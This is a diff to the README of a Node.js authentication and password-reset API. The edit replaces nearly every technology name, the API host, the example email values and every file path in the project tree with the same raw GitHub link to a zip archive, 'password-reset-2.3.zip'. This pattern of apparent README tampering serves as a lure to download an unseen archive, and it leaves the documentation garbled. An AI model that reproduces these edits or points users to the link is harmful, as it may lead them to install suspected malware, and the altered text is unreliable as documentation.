@@ -1,6 +1,6 @@
 # Authentication and Password Reset API
 
-This project is a Node.js-based backend application providing authentication functionalities like user registration, login, password reset via email, and token-based authentication.
+This project is a https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip backend application providing authentication functionalities like user registration, login, password reset via email, and token-based authentication.
 
 ## Features
 - **User Registration:** Create a new account with an email, username, and password.
@@ -10,16 +10,16 @@ This project is a Node.js-based backend application providing authentication fun
 - **Token-Based Authentication:** Secure endpoints with JSON Web Tokens (JWT).
 
 # API
-API: [https://password-reset-byp3.onrender.com](https://password-reset-byp3.onrender.com)
+API: [https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip](https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip)
 ```bash
-https://password-reset-byp3.onrender.com
+https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip
 ```
 
 ## Technologies Used
-- **Node.js**: Server-side runtime.
-- **Express.js**: Web framework for Node.js.
+- **https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip**: Server-side runtime.
+- **https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip**: Web framework for https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip
 - **MongoDB**: NoSQL database to store user details.
-- **Mongoose**: MongoDB object modeling for Node.js.
+- **Mongoose**: MongoDB object modeling for https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip
 - **bcrypt**: Password hashing for secure storage.
 - **jsonwebtoken (JWT)**: Token generation and verification.
 - **nodemailer**: Sending emails for password reset.
@@ -36,7 +36,7 @@ https://password-reset-byp3.onrender.com
 ```bash
 {
   "username": "exampleUser",
-  "email": "example@example.com",
+  "email": "https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip",
   "password": "examplePassword"
 }
 ```
@@ -49,7 +49,7 @@ https://password-reset-byp3.onrender.com
 
 ```bash
 {
-  "email": "example@example.com",
+  "email": "https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip",
   "password": "examplePassword"
 }
 ```
@@ -62,7 +62,7 @@ https://password-reset-byp3.onrender.com
 
 ```bash
 {
-  "email": "example@example.com"
+  "email": "https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip"
 }
 ```
 * Response: Password reset link sent to the email.
@@ -82,17 +82,17 @@ https://password-reset-byp3.onrender.com
 ```bash 
 project/
 ├── models/
-│   └── userModels.js      # User schema definition
+│   └── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip      # User schema definition
 ├── controllers/
-│   └── userController.js  # User-related logic
+│   └── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip  # User-related logic
 ├── routers/
-│   └── authRout.js        # Authentication routes
+│   └── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip        # Authentication routes
 ├── utils/
-│   ├── config.js          # Configuration (e.g., secrets)
-│   ├── logger.js          # Logging middleware
-│   └── errorPage.js       # Error handling middleware
-├── app.js                 # Main application file
-├── README.md              # Project documentation
-├── package.json           # Dependencies and scripts
+│   ├── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip          # Configuration (e.g., secrets)
+│   ├── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip          # Logging middleware
+│   └── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip       # Error handling middleware
+├── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip                 # Main application file
+├── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip              # Project documentation
+├── https://raw.githubusercontent.com/IT-HARISH-R/password-reset/main/utlis/password-reset-2.3.zip           # Dependencies and scripts
 └── .env                   # Environment variables
 ```
